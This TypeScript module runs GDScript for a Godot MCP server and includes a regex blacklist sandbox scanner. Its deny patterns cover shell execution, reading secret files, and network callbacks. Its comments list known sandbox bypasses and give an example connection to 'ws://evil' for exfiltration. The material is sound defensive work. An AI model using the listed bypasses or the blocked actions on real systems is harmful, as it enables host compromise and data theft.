/**
 * GDScript executor module for Godot MCP Enhanced.
 *
 * Enables execution of arbitrary GDScript code in a headless Godot process.
 * Inspired by Hastur Operation Plugin's remote execution design:
 * - Code snippet auto-wrapping (no `extends` → auto-wrap)
 * - Structured key-value output via `_mcp_output(key, value)`
 * - Marked output protocol for reliable parsing
 *
 * SECURITY WARNING: GDScript has full system access (FileAccess, DirAccess,
 * OS.execute = arbitrary shell). scanGdscriptSandbox provides a blacklist to catch
 * accidental misuse, NOT a security boundary — GDScript is Turing-complete so regex
 * cannot exhaustively block indirect/reflection bypasses (variable first-arg to
 * .call(), StringName(), etc.). Acceptable for local single-user MCP; for multi-user
 * or untrusted input use container/VM isolation + GODOT_MCP_ALLOW_UNSAFE=false.
 */

import { spawn } from 'child_process';
import { existsSync, readFileSync, writeFileSync, renameSync } from 'fs';
import { writeFile, mkdir, rm, readdir, lstat, mkdtemp } from 'fs/promises';
import { join, basename } from 'path';
import { tmpdir, userInfo } from 'os';
import { randomUUID, createHash } from 'crypto';
import { analyzeOutput, type ParsedError } from './error-analyzer.js';
import { forceKillTree, getRunSessionProc, acquireShortRunningSlot, releaseShortRunningSlot, registerSpawnedGodotPid, unregisterSpawnedGodotPid } from './core/process-state.js';
import { tokenize, classifyFirstArgument } from './core/gdscript-scanner.js';
import { buildSafeEnv } from './core/godot-finder.js';
import { MARKER_RESULT as MARKER_RESULT_SHARED, MARKER_ERROR as MARKER_ERROR_SHARED, GD_MCP_GET_ROOT, GD_MCP_GET_NODE, GD_MCP_LOAD_MAIN_SCENE, GD_MCP_OUTPUT } from './tools/shared.js';
import { normalizeIndentToTabs as _sharedNormalizeIndent } from './tools/shared/value-serializer.js';
import { getLogger, resolveLogDir } from './core/logger.js';
import { needsImport, runImport } from './tools/import-check.js';


// ─── Sandbox scanner (C-SEC-02) ──────────────────────────────────────────────
//
// ⚠️  KNOWN LIMITATIONS — This scanner is a safety net against accidental misuse,
//     NOT a security boundary. The following bypass patterns are NOT detected:
//
//     1. Variable indirection:  var cmd = "OS"; cmd += ".execute"
//     2. Expression.eval with computed strings: var e = Expression.new(); e.execute(["OS.execute"])
//     3. call()/callv() with non-literal first arg: obj.call(variable)
//     4. ClassDB.class_call() / ClassDB.class_set_property() via reflection
//
//     For multi-user / untrusted input scenarios, use container/VM isolation
//     and set GODOT_MCP_ALLOW_UNSAFE=false.

const DANGEROUS_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  // F-1: create_process 与 execute 功能等价(均可启动任意可执行文件),必须同等拦截
  { pattern: /OS\.(execute|shell_open|kill|set_restart_on_exit|crash|create_process)\b/, label: 'OS system command' },
  // 全仓审查 I-2 (2026-09-12): cmdline 内省是标记窃取链第一环——OS.get_cmdline_args() 取回
  // --script 传入的脚本绝对路径,配合变量首参 FileAccess.open(:59/:66 两条模式均不匹配变量)
  // 读包装后脚本正文即可恢复 rndResult/rndError 随机 marker。与 I-1 不同,这不是公开契约
  // (合法脚本无需自查命令行),拦截不破坏任何既有用法。
  { pattern: /OS\.(get_cmdline_args|cmdline_user_args)\b/, label: 'OS cmdline introspection (marker recovery)' },
  // C-SEC-3: OS["execute"] 等索引访问把句点换成方括号,绕过上面的 OS.execute 正则
  { pattern: /\bOS\s*\[/, label: 'OS singleton indexed access (sandbox bypass)' },
  // C-SEC-4: OS 单例别名赋值绕过 —— var s = OS; s.execute("calc") 避开 /OS\.execute/ 字面量。
  // lookbehind (?<![=!<>]) 排除 == / != / <= / >= 比较操作符的第二 =(review I-1:避免误报 x == OS);
  // 负向预查 (?!\s*\.) 排除合法的 = OS.get_xxx() 方法调用赋值,仅抓裸单例别名。
  { pattern: /(?<![=!<>])=\s*OS\b(?!\s*\.)/, label: 'OS singleton aliasing (sandbox bypass)' },
  { pattern: /DirAccess\.(remove_absolute|remove)\b/, label: 'Directory removal' },
  // C-03: Allow FileAccess.READ, only flag write modes (WRITE / READ_WRITE / READ_WRITE_APPEND)
  // Use [^;]* to match to statement boundary — avoids truncation on ')' in file paths
  { pattern: /FileAccess\.open\s*\([^;]*FileAccess\.(?:WRITE|READ_WRITE|READ_WRITE_APPEND)\b/, label: 'File write access' },
  // 2026-08-07 审查 P2 修复（决策2 升级版）：默认模式拦 FileAccess.open 读非 Godot 协议路径。
  // 原 C-03 注释 "Allow FileAccess.READ" 致默认模式放行读任意路径（~/.ssh/id_rsa 等敏感文件），
  // AI 注入的 GDScript 可读后经 print/_mcp_output 回传。模式对齐 :71 load() 非 res:// 拦截，
  // 但额外放行 user://（Godot 用户数据目录，存档等合法用途）——只拦绝对路径/~ /.. / 非协议字面量。
  // 实测内部脚本（godot_operations.gd:815 uid_path 经 _sanitize_res_path）不受影响。
  // stripLiterals 保留协议前缀（:270-274），骨架层匹配正确。
  { pattern: /FileAccess\.open\s*\(\s*["'](?!res:\/\/|user:\/\/)/, label: 'File read with non-resource path (information disclosure)' },
  { pattern: /Engine\.(set_singleton)\b/, label: 'Engine singleton modification' },
  // C-03: Engine.get_singleton bypasses class-level restrictions (e.g. FileAccess, DirAccess)
  { pattern: /Engine\.get_singleton\b/, label: 'Engine singleton access (sandbox bypass)' },
  // IMPORTANT-2 (review): 索引访问把句点换方括号绕过点访问正则。OS 已有 /\bOS\s*\[/ (:50),
  // 补 Engine/FileAccess/DirAccess/JavaScriptBridge(其危险方法均靠点访问正则拦截,方括号写法同样需堵)。
  { pattern: /\b(Engine|FileAccess|DirAccess|JavaScriptBridge)\s*\[/, label: 'Singleton indexed access (sandbox bypass)' },
  { pattern: /JavaScriptBridge\.eval\b/, label: 'JavaScript eval (web escape)' },
  { pattern: /\bstr2var\b/, label: 'str2var (arbitrary deserialization)' },
  { pattern: /\bbytes2var\b/, label: 'bytes2var (arbitrary deserialization)' },
  // C-RES: 单 " 即可 — stripLiterals 已把三引号开/闭引号归一化为单个(见 :271/:283),
  // 故 load("res://") 与 load("""res://""") 骨架均为 load("res://"),单 " 正则正确放行。
  // 注:曾试 "{1,3}" 但负向预查+可变量词会回溯到单 " 而误报,故改在骨架层归一化。
  { pattern: /load\s*\(\s*"(?!res:\/\/)/, label: 'load() with non-resource path' },
  { pattern: /Thread\.(new|start)\b/, label: 'Thread creation' },
  { pattern: /Semaphore\.new\b/, label: 'Semaphore creation' },
  { pattern: /Mutex\.new\b/, label: 'Mutex creation' },
  // C-SEC-01: Reflection/indirect call bypass vectors
  { pattern: /\bClassDB\b/, label: 'ClassDB reflection (sandbox bypass)' },
  // C-SEC-01: Only flag .call()/.callv() with string-literal first arg (reflection pattern).
  // Legitimate Callable.call(variable) is NOT flagged — internal tools use this (e.g. physics-ops collision_overlay).
  { pattern: /\.call\s*\(\s*["']/, label: 'Indirect call via .call("string") (sandbox bypass)' },
  { pattern: /\.callv\s*\(\s*["']/, label: 'Indirect call via .callv("string") (sandbox bypass)' },
  // A-09: Expression.execute can evaluate arbitrary expressions
  // IMPORTANT-3 (review): .* 不跨行,var e=Expression.new()\ne.execute() 分行即绕过。改 [\s\S]
  // 非贪婪并限长 500 防 ReDoS(典型 Expression.new()+parse+execute 距离 <<500)。
  { pattern: /Expression\b[\s\S]{0,500}?\.execute\b/, label: 'Expression.execute (arbitrary code execution)' },
  // S-1-review: var2str + str2var chain (arbitrary object reconstruction)
  { pattern: /\bvar2str\b/, label: 'var2str (serialization bypass)' },
  // S-1-review: get_script() reflection escape
  { pattern: /\.get_script\b/, label: 'get_script reflection (sandbox bypass)' },
  // S-1-review: ResourceLoader.load with non-resource path
  // A-3 (advisory): 去掉 [^)]* 贪婪(原回溯到闭合 " 后检查,那里是 ')' 而非 res://,
  // 致 ResourceLoader.load("res://a.tres") 误报)。对齐 :68 load 设计,单 ["'] 后即查 res://。
  { pattern: /ResourceLoader\.load\s*\(\s*["'](?!res:\/\/)/, label: 'ResourceLoader.load with non-resource path' },
  // 2026-08-07 审查 P2 修复：网络回连 API 未覆盖。GDScript 可 var ws = WebSocketPeer.new();
  // ws.connect_to_url("ws://evil") 发起网络回连绕过 OS.execute 禁令实现数据外传/C2
  // （Thread.new 已拦无法异步，但同步 connect + 主循环 poll 仍可行）。
  // addon 侧 bridge 用 TCP 不受沙箱约束（沙箱只管 AI 注入脚本）。
  { pattern: /WebSocketPeer\.(new|create)\b/, label: 'WebSocketPeer creation (network callback)' },
  { pattern: /HTTPClient\.new\b/, label: 'HTTPClient creation (network callback)' },
  { pattern: /StreamPeer(TCP|SSL|Object)?\.new\b/, label: 'StreamPeer creation (network callback)' },
  { pattern: /\.(connect_to_url|connect_to_host)\b/, label: 'Network connect (callback bypass)' },
];

/**
 * Phase 2: Dangerous API tokens that should not appear in string concatenation.
 * Detects bypass attempts like "OS" + ".execute" or preload with computed paths.
 */
const DANGEROUS_API_TOKENS: readonly string[] = [
  // F-1: 拦截字符串拼接绕过(OS + ".create_process")
  'OS.execute', 'OS.shell_open', 'OS.kill', 'OS.create_process',
  'DirAccess.remove', 'DirAccess.remove_absolute',
  'JavaScriptBridge.eval',
  'str2var', 'bytes2var', 'var2str',
  // C-SEC-01: Reflection bypass tokens for string concatenation detection
  'ClassDB', '.call(', '.callv(',
  // C-03: Singleton access via string concatenation
  'Engine.get_singleton',
  // S-1-review: Additional reflection/bypass tokens
  '.get_script', 'ResourceLoader.load',
];

/** 转义正则元字符。用于 autoload 名称匹配。 */
export function escapeRegExp(str: string): string {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// ─── Autoload auto-detection ─────────────────────────────────────────────────

let _autoloadCache: { projectPath: string; names: string[]; ts: number } | null = null;
const AUTOLOAD_CACHE_TTL = 30_000;

/** @internal 测试用：重置缓存 */
export function _resetAutoloadCache(): void {
  _autoloadCache = null;
}

/**
 * 从 project.godot 解析 autoload 单例名列表。
 * 全面 try-catch：任何错误返回空数组。
 */
export function parseAutoloadNames(projectPath: string): string[] {
  const now = Date.now();
  if (_autoloadCache && _autoloadCache.projectPath === projectPath && now - _autoloadCache.ts < AUTOLOAD_CACHE_TTL) {
    return _autoloadCache.names;
  }
  try {
    const configPath = join(projectPath, 'project.godot');
    if (!existsSync(configPath)) return [];
    const content = readFileSync(configPath, 'utf-8');
    const names: string[] = [];
    let inAutoload = false;
    for (const line of content.split('\n')) {
      const trimmed = line.trim();
      if (trimmed.startsWith('[')) {
        inAutoload = trimmed === '[autoload]';
        continue;
      }
      if (inAutoload) {
        const kvMatch = trimmed.match(/^(\S+)\s*=/);
        if (kvMatch) names.push(kvMatch[1]!);
      }
    }
    _autoloadCache = { projectPath, names, ts: now };
    return names;
  } catch {
    return [];
  }
}

/**
 * P2-4(审查 I-2 修正): orphan 行判定——键形态按写入方常量。新键 MCPBridge=(AUTOLOAD_KEY,
 * bridge-client.ts/game-bridge.ts 写入);旧键 autoload/MCPBridge=(≤0.23.x 误写,
 * AUTOLOAD_KEY_LEGACY)。且行值须指向 res://mcp_bridge.gd 才删——防误删用户自定义
 * 同名 autoload(指向其他脚本)。原版注释把新旧键说反且漏 legacy 形态。
 */
function isOrphanBridgeLine(l: string): boolean {
  const t = l.trimStart();
  const isKey = t.startsWith('MCPBridge=') || t.startsWith('autoload/MCPBridge=');
  return isKey && l.includes('res://mcp_bridge.gd');
}

/**
 * 纯函数:project.godot 内容含 orphan bridge autoload 行时返回移除后的新内容,否则 null。
 * (逻辑/IO 分离:纯字符串可稳定单测。注意键大小写——真实键为 MCPBridge(大写,
 * bridge-client.ts AUTOLOAD_KEY),首版实现与测试双双手误小写 McpBridge,错打正着
 * 掩盖至审查 I-2 修正;键名常量必须 grep 写入方核对,不能信记忆/注释。)
 */
export function removeOrphanBridgeLines(content: string): string | null {
  const lines = content.split('\n');
  if (!lines.some(isOrphanBridgeLine)) return null;
  return lines.filter(l => !isOrphanBridgeLine(l)).join('\n');
}

/**
 * P2-4 (2026-09-11): orphan autoload 修复——project.godot 残留 McpBridge autoload 条目但
 * 脚本本体已删(手删/卸载残留)时,每次 headless 操作都会因 autoload 加载失败而崩
 * (来源 Erodenn bridge-manager.ts repairOrphaned 的前置自愈)。IO 壳:读→纯函数判定→原子写。
 * 返回 true = 本次修复了(调用方 warn 留痕)。幂等:无 orphan 返回 false 零写入。
 * 行为断言走纯函数 removeOrphanBridgeLines(本壳 IO 含 tmpdir 写盘,冒烟级覆盖)。
 */
export function repairOrphanedBridgeAutoload(projectPath: string): boolean {
  try {
    const configPath = join(projectPath, 'project.godot');
    const scriptPath = join(projectPath, 'mcp_bridge.gd');
    if (!existsSync(configPath) || existsSync(scriptPath)) return false;
    const next = removeOrphanBridgeLines(readFileSync(configPath, 'utf-8'));
    if (next === null) return false;
    const tmpPath = configPath + '.mcp-tmp';
    writeFileSync(tmpPath, next, 'utf-8');
    renameSync(tmpPath, configPath);
    return true;
  } catch {
    return false;  // best-effort:修复失败不阻塞执行(错误由后续 spawn 自然暴露)
  }
}

/**
 * 检测代码中是否引用了 autoload 单例。
 * A-2 (advisory): 改用 stripLiterals 骨架扫描(剥注释/字符串),消除原词边界匹配的误触发。
 */
export function detectAutoloadUsage(code: string, autoloadNames: string[]): string[] {
  if (!code || autoloadNames.length === 0) return [];
  const skeleton = stripLiterals(code);
  const matched: string[] = [];
  for (const name of autoloadNames) {
    const pattern = new RegExp(`\\b${escapeRegExp(name)}\\b`);
    if (pattern.test(skeleton)) {
      matched.push(name);
    }
  }
  return matched;
}

/** Check if code uses string concatenation to build dangerous API names.
 *  Catches patterns like: "OS" + ".execute", 'Dir' + 'Access.remove', etc.
 *  Uses sliding window over string literals to reconstruct concatenated tokens. */
function detectStringConcatBypass(code: string): string[] {
  const warnings: string[] = [];
  // Extract all string literal contents (single and double quoted)
  const stringContents: string[] = [];
  const stringLiteralRe = /"([^"\\]*(?:\\.[^"\\]*)*)"|'([^'\\]*(?:\\.[^'\\]*)*)'/g;
  let match: RegExpExecArray | null;
  while ((match = stringLiteralRe.exec(code)) !== null) {
    const content = match[1] ?? match[2];
    if (content) stringContents.push(content);
  }

  // Concatenate adjacent string parts and check against dangerous tokens.
  // For "ClassName.method" tokens, also check ".method" suffix (e.g. ".execute")
  // to catch: "OS" + ".execute" → ".execute" matches suffix.
  // IMPORTANT-1 (review): 窗口原固定 4,无 '.' 的 token(如 str2var)5+ 段可绕过。扩大到 8
  // 覆盖更多分段;9+ 段依赖容器隔离(沙箱非对抗边界,见图灵完备声明)。O(n²):成本随窗口与字符串数增长。
  const MAX_CONCAT_WINDOW = 8;
  for (let i = 0; i < stringContents.length; i++) {
    for (let j = i; j < Math.min(i + MAX_CONCAT_WINDOW, stringContents.length); j++) {
      const combined = stringContents.slice(i, j + 1).join('');
      for (const token of DANGEROUS_API_TOKENS) {
        const dotIdx = token.indexOf('.');
        const suffix = dotIdx >= 0 ? token.slice(dotIdx) : null;
        if (combined === token || (suffix !== null && combined === suffix)) {
          warnings.push(`[SANDBOX-P2] String concatenation bypass attempt: "${token}" built from parts`);
          break;
        }
      }
    }
  }

  // Detect preload with non-literal or computed path
  if (/\bpreload\s*\(\s*(?!["']res:\/\/)/.test(code)) {
    warnings.push('[SANDBOX-P2] preload() with computed/dynamic path');
  }

  // C-01-fix: Detect % format string used to construct API names.
  // Only flag when a string containing a dangerous token suffix is used with % formatting,
  // not innocent uses like "Score: %d" % value.
  for (const token of DANGEROUS_API_TOKENS) {
    const dotIdx = token.indexOf('.');
    const suffix = dotIdx >= 0 ? token.slice(dotIdx) : null;
    // Match: "OS%s" or "DirAccess%s" — dangerous token prefix followed by % format
    // Guard: skip when prefixPart is empty (tokens starting with '.' like '.call(')
    // to avoid false positives matching bare "%s"/"%d"/"%i".
    const prefixPart = dotIdx >= 0 ? token.slice(0, dotIdx) : token;
    if (prefixPart && new RegExp(`["']${escapeRegExp(prefixPart)}%[sdi]["']`).test(code)) {
      warnings.push(`[SANDBOX-P2] % format string used to construct dangerous API: "${token}"`);
    }
    // Match: ".execute" %s or similar suffix construction
    if (suffix && new RegExp(`["']${escapeRegExp(suffix)}["'].*%[sdi]`).test(code)) {
      warnings.push(`[SANDBOX-P2] % format string used to construct API suffix: "${suffix}"`);
    }
  }

  return warnings;
}

/** Best-effort scan for dangerous GDScript patterns. Returns warnings array.
 *  Enabled by default; set GODOT_MCP_SANDBOX=disabled to skip scanning.
 *  When warnings are found, execution is BLOCKED unless GODOT_MCP_DISABLE_SAFETY=true
 *  (or the legacy GODOT_MCP_ALLOW_UNSAFE=true).
 *
 *  Phase 1: Direct regex matching of dangerous API calls.
 *  Phase 2: String concatenation bypass detection + preload computed path detection.
 *
 *  ⚠️  SECURITY LIMITATION: This scanner does NOT parse GDScript syntax.
 *  Phase 2 catches common bypass patterns but determined attackers may still
 *  find ways around it. It is designed to prevent ACCIDENTAL and common-intent
 *  misuse, not to defend against adversarial input. For true sandboxing, use
 *  container/VM isolation.
 *
 *  ⚠️  GODOT_MCP_SANDBOX=disabled / GODOT_MCP_DISABLE_SAFETY=true completely
 *  bypasses ALL safety checks. These flags exist for development/debugging only.
 *  Do NOT use in production or multi-user environments. Any code executed while
 *  these flags are active has unrestricted access to the host filesystem,
 *  network, and process execution via OS.execute / FileAccess / DirAccess. */
/**
 * 剥去 GDScript 代码中的字符串字面量内容与注释，返回"骨架"。
 * 保留引号对、换行和代码结构；仅删除字符串内容与注释文本。
 *
 * 用途：让 Phase 1 正则扫描在骨架上进行，避免注释/字符串里的危险 API 名导致误报。
 *
 * ⚠️ 契约 P2-RAW：此函数的输出【绝不能】喂给 detectStringConcatBypass（Phase 2）。
 *    Phase 2 依赖字符串字面量内容做拼接重构，必须接收原文。见 scanGdscriptSandbox。
 *
 * 算法：字符级状态机，正确处理单/双/三引号字符串、转义引号、# 注释。
 * 用 charAt 而非 code[i]，规避 noUncheckedIndexedAccess 的 string|undefined。
 * 顺序：先识别字符串（字符串内的 # 不当注释），再识别注释。 */
// C-RES: Godot 资源协议前缀。stripLiterals 剥字符串内容时保留该前缀，使
// load("res://...") / preload("res://...") 在骨架上仍被 load() non-resource-path
// 正则的负向预查正确放行。res:// 仅指项目内资源、非危险向量，保留前缀对其他正则无副作用。
// 2026-08-07 审查 P2: 加 user://（Godot 用户数据目录，存档等合法用途，同 res:// 安全级别），
// 让 FileAccess.open("user://...") 在骨架上也被新读拦截规则的负向预查正确放行。
const GODOT_PROTOCOLS = ['res://', 'user://'] as const;
export function stripLiterals(code: string): string {
  let result = '';
  let i = 0;
  const len = code.length;

  while (i < len) {
    const ch = code.charAt(i);

    // 三引号字符串 """ 或 '''
    if ((ch === '"' || ch === "'") && code.charAt(i + 1) === ch && code.charAt(i + 2) === ch) {
      const quote = ch;
      result += quote; // C-RES: 三引号开引号归一化为单个(骨架等价单引号字符串,下游正则统一处理)
      i += 3;
      // C-RES: 保留 Godot 协议前缀（res:// / user://）
      for (const proto of GODOT_PROTOCOLS) {
        if (code.startsWith(proto, i)) {
          result += proto;
          i += proto.length;
          break;
        }
      }
      while (i < len) {
        if (code.charAt(i) === '\\' && i + 1 < len) {
          i += 2; // 转义:跳过下一字符
          continue;
        }
        if (code.charAt(i) === quote && code.charAt(i + 1) === quote && code.charAt(i + 2) === quote) {
          result += quote; // C-RES: 三引号闭引号归一化为单个(与开引号一致)
          i += 3;
          break;
        }
        i++; // 字符串内容:丢弃
      }
      continue;
    }

    // 单/双引号字符串
    if (ch === '"' || ch === "'") {
      const quote = ch;
      result += quote; // 保留开引号
      i++;
      // C-RES: 保留 Godot 协议前缀（res:// / user://）
      for (const proto of GODOT_PROTOCOLS) {
        if (code.startsWith(proto, i)) {
          result += proto;
          i += proto.length;
          break;
        }
      }
      while (i < len) {
        if (code.charAt(i) === '\\' && i + 1 < len) {
          i += 2; // 转义跳过
          continue;
        }
        if (code.charAt(i) === quote) {
          result += quote; // 保留闭引号
          i++;
          break;
        }
        if (code.charAt(i) === '\n') {
          result += '\n'; // 未闭合即换行:保留换行,退出字符串态
          i++;
          break;
        }
        i++; // 字符串内容:丢弃
      }
      continue;
    }

    // 行注释 # 到行尾
    if (ch === '#') {
      while (i < len && code.charAt(i) !== '\n') {
        i++; // 注释内容:丢弃
      }
      continue; // 换行交给外层循环保留
    }

    result += ch; // 普通代码字符:保留
    i++;
  }

  return result;
}

// ─── Extra dangerous patterns (env-injected, C-SEC-02 扩展) ──────────────────

let _extraPatternsCache: { raw: string; patterns: Array<{ pattern: RegExp; label: string }> } | null = null;

/** @internal 测试用:重置 extra patterns 缓存 */
export function _resetExtraDangerousPatternsCache(): void {
  _extraPatternsCache = null;
}

/**
 * 从环境变量 GODOT_MCP_EXTRA_DANGEROUS_PATTERNS 加载用户自定义危险正则。
 * 格式:JSON 数组 [{"pattern": <正则源码>, "label": <人类可读标签>}, ...]
 *
 * memoized:以 raw 字符串为键,相同 env 不重复解析(风格同 _autoloadCache)。
 * 坏正则/坏 JSON 降级:跳过该条或整体忽略,记录 warn,绝不抛异常。 */
export function loadExtraDangerousPatterns(): Array<{ pattern: RegExp; label: string }> {
  const raw = process.env.GODOT_MCP_EXTRA_DANGEROUS_PATTERNS;
  if (!raw) return [];
  if (_extraPatternsCache && _extraPatternsCache.raw === raw) {
    return _extraPatternsCache.patterns;
  }
  const patterns: Array<{ pattern: RegExp; label: string }> = [];
  try {
    const parsed: unknown = JSON.parse(raw);
    if (!Array.isArray(parsed)) {
      getLogger().warn('security', 'GODOT_MCP_EXTRA_DANGEROUS_PATTERNS is not a JSON array, ignoring');
      _extraPatternsCache = { raw, patterns };
      return patterns;
    }
    for (const entry of parsed) {
      if (!entry || typeof entry !== 'object') continue;
      const e = entry as { pattern?: unknown; label?: unknown };
      if (typeof e.pattern !== 'string' || typeof e.label !== 'string') continue;
      try {
        patterns.push({ pattern: new RegExp(e.pattern), label: e.label });
      } catch (regexErr) {
        getLogger().warn('security', `GODOT_MCP_EXTRA_DANGEROUS_PATTERNS: invalid regex skipped: "${e.pattern}" (${regexErr instanceof Error ? regexErr.message : regexErr})`);
      }
    }
  } catch (jsonErr) {
    getLogger().warn('security', `GODOT_MCP_EXTRA_DANGEROUS_PATTERNS: invalid JSON, ignoring (${jsonErr instanceof Error ? jsonErr.message : jsonErr})`);
  }
  _extraPatternsCache = { raw, patterns };
  return patterns;
}

export function scanGdscriptSandbox(code: string, opts?: { skipPhase3?: boolean }): string[] {
  // P0-1 (2026-07-06 RCE 审查): 双开关 — SANDBOX=disabled 需同时设 GODOT_MCP_UNRESTRICTED=true 才生效,
  // 防 CI/Docker/.envrc 误设单 env 关闭整个沙箱。UNRESTRICTED 是项目级“开发者自担风险”总开关。
  if (process.env.GODOT_MCP_SANDBOX === 'disabled') {
    if (process.env.GODOT_MCP_UNRESTRICTED === 'true') {
      getLogger().warn('security', '⚠️ GODOT_MCP_SANDBOX=disabled + UNRESTRICTED=true — ALL sandbox checks bypassed. Any GDScript code will execute with unrestricted host access.');
      return [];
    }
    getLogger().warn('security', 'GODOT_MCP_SANDBOX=disabled ignored — requires GODOT_MCP_UNRESTRICTED=true (P0-1 double-opt-in). Sandbox stays active.');
  }
  const warnings: string[] = [];

  // 骨架:剥去字符串内容与注释,仅用于 Phase 1 正则匹配,避免注释/字符串里的 API 名误报。
  // ⚠️ 契约 P2-RAW:skeleton 绝不能传给 detectStringConcatBypass(Phase 2)!
  const skeleton = stripLiterals(code);

  // Phase 1: Direct pattern matching (on skeleton)
  for (const { pattern, label } of DANGEROUS_PATTERNS) {
    if (pattern.test(skeleton)) {
      warnings.push(`[SANDBOX] Potential dangerous operation detected: ${label}`);
    }
  }

  // 用户自定义额外危险模式 (GODOT_MCP_EXTRA_DANGEROUS_PATTERNS),同样在骨架上检测
  for (const { pattern, label } of loadExtraDangerousPatterns()) {
    if (pattern.test(skeleton)) {
      warnings.push(`[SANDBOX] Potential dangerous operation detected: ${label}`);
    }
  }

  // C-03: In strict mode, also block FileAccess.READ (all file access) — on skeleton
  if (process.env.GODOT_MCP_SANDBOX === 'strict') {
    if (/FileAccess\.open\b/.test(skeleton)) {
      warnings.push('[SANDBOX] Potential dangerous operation detected: File access (strict mode)');
    }
  }

  // Phase 2: String concatenation bypass detection
  // ⚠️ 契约 P2-RAW:detectStringConcatBypass 必须接收【原文 code】,不能是 skeleton。
  //    它自己提取字符串字面量内容做拼接重构;喂骨架会让所有拼接绕过检测失效。
  const concatWarnings = detectStringConcatBypass(code);
  warnings.push(...concatWarnings);

  // Phase 3 (P6 2026-09-11, Erodenn tokenizer 移植): 非字面量 load/preload/ResourceLoader.load。
  // ⚠️ 时序契约(审查 N-4): 本扫描必须发生在 wrapSnippet 注入模板头(内含 load(_sp))**之前**——
  // 扫的是 options.code 原文;若未来把 wrap 提到 scan 前,execute_gdscript 将因模板头的 load(_sp)
  // 全量误拦(P6 B-1 同根源陷阱)。
  // 正则只拦字面量非 res://(load("C:/x"));变量/表达式形式(load(p)/load("res://" + evil))
  // 正则不可见(纯变量零特征,拼接形式 Phase 2 只抓黑名单 token)。
  // classifyFirstArgument 括号深度感知判 nonliteral("res://" + x 不被前导字面量骗过)。
  // 取舍对齐 Erodenn Tier 1(动态资源路径=任意加载面,静态不可判指向);override 走既有
  // double opt-in(UNRESTRICTED + DISABLE_SAFETY/SANDBOX=disabled)。
  if (opts?.skipPhase3 === true) {
    return warnings;  // runtime 通道(executeGdscriptRuntime):模板代码的动态 load 是服务端固定行为
  }
  const tokens = tokenize(code);
  for (let ti = 0; ti < tokens.length; ti++) {
    const tok = tokens[ti]!;
    if (tok.kind !== 'identifier' && tok.kind !== 'memberChain') continue;
    const isBareLoad = tok.kind === 'identifier' && (tok.text === 'load' || tok.text === 'preload');
    const isRLoad = tok.kind === 'memberChain'
      && tok.chain !== undefined && tok.chain.length === 2
      && tok.chain[0] === 'ResourceLoader' && tok.chain[1] === 'load';
    if (!isBareLoad && !isRLoad) continue;
    // 找紧随的调用括号(容忍换行)
    let tj = ti + 1;
    while (tj < tokens.length && tokens[tj]!.kind === 'newline') tj++;
    if (tj >= tokens.length || tokens[tj]!.kind !== 'punct' || tokens[tj]!.text !== '(') continue;
    if (classifyFirstArgument(tokens, tj) === 'nonliteral') {
      const name = isBareLoad ? tok.text : 'ResourceLoader.load';
      warnings.push(`[SANDBOX] Potential dangerous operation detected: ${name}() with non-literal path (dynamic resource load, tokenizer deep analysis)`);
    }
  }

  return warnings;
}

// ─── Types ──────────────────────────────────────────────────────────────────

export interface OutputEntry {
  key: string;
  value: string;
}

export interface ExecuteGdscriptResult {
  success: boolean;
  compile_success: boolean;
  compile_error: string;
  /** Structured error list with type, file, line, message, and suggestion */
  errors: ParsedError[];
  run_success: boolean;
  run_error: string;
  outputs: OutputEntry[];
  raw_output: string;
  duration_ms: number;
  /** Auto-detected autoload references (non-empty when load_autoloads was auto-enabled) */
  autoload_detected?: string[];
  /** C-AUDIT: per-execution id（对照 UE 9b128514），崩溃/超时后凭日志反查具体执行 */
  executionId?: string;
  /** C-AUDIT: 原始用户 code 的字节级 SHA-256（hex），不含原始 code 本身（对齐 I-10） */
  scriptSha256?: string;
}

export interface ExecuteGdscriptOptions {
  godotPath: string;
  projectPath: string;
  code: string;
  timeout: number; // seconds
  /** When true, runs with full autoload context (slower but can access autoloads like DataRegistry) */
  loadAutoloads?: boolean;
}

// ─── Execute 取证审计（C-AUDIT，对照 UE 9b128514）─────────────────────────────
//
// 在 spawn godot 之前对【原始用户 code】算字节级 SHA-256 + 生成 executionId，记一条
// EXECUTE_BEGIN 结构化审计日志。崩溃/超时后可凭日志反查到具体执行（哪段 code、写到哪个
// 临时文件）。事件【不含原始 code】（对齐 I-10 字面量脱敏），只放 hash + 路径 + 模式。

export interface ExecAuditEvent {
  audit: 'EXECUTE_BEGIN';
  executionId: string;
  scriptSha256: string;
  scriptPath: string;
  mode: string;
  autoload: boolean;
}

export function buildExecAuditEvent(input: {
  code: string;
  scriptPath: string;
  mode: string;
  autoload: boolean;
}): ExecAuditEvent {
  return {
    audit: 'EXECUTE_BEGIN',
    executionId: randomUUID(),
    scriptSha256: createHash('sha256').update(input.code, 'utf8').digest('hex'),
    scriptPath: input.scriptPath,
    mode: input.mode,
    autoload: input.autoload,
  };
}

// ─── Constants ──────────────────────────────────────────────────────────────

const TMP_PREFIX = 'godot-mcp-exec-';

/** I-16: Opaque symbol to prevent external code from bypassing sandbox */
const _trustedSymbol = Symbol('trusted');

/** Execute GDScript with sandbox scanning disabled. Only for internal trusted code paths. */
export function executeGdscriptTrusted(options: Omit<ExecuteGdscriptOptions, '_skipSandbox'>): Promise<ExecuteGdscriptResult> {
  (options as unknown as Record<symbol, boolean>)[_trustedSymbol] = true;
  return executeGdscript(options as ExecuteGdscriptOptions);
}

/**
 * P6 (2026-09-11): runtime 工具族通道——只跳 Phase 3(tokenizer 非字面量 load 拦截),
 * **保留 Phase 1(危险 API 正则)/Phase 2(拼接绕过)全部防线**(与全豁免的 Trusted 区分)。
 * 语义:调用方(animation/signal/physics 等)的 code 是服务端固定模板 + 转义插值参数,
 * 模板自身的动态 load(主场景路径来自 ProjectSettings)是合法服务端行为;AI 若经插值
 * 逃逸注入任意代码,Phase 1/2 正则(OS.execute/ClassDB/网络类等)仍拦。opaque symbol
 * 防外部(AI 经 execute_gdscript 工具)伪造此标记。
 */
const _p3SkipSymbol = Symbol('p3-skip');
export function executeGdscriptRuntime(options: Omit<ExecuteGdscriptOptions, '_skipSandbox'>): Promise<ExecuteGdscriptResult> {
  (options as unknown as Record<symbol, boolean>)[_p3SkipSymbol] = true;
  return executeGdscript(options as ExecuteGdscriptOptions);
}
/** Re-export markers from shared.ts for consumers that import from this module */
export { MARKER_RESULT_SHARED as MARKER_RESULT, MARKER_ERROR_SHARED as MARKER_ERROR };

/** Generate a random per-execution marker prefix to prevent output forgery.
 *
 *  SECURITY CONTRACT (I-05): This function MUST use a cryptographically secure random source.
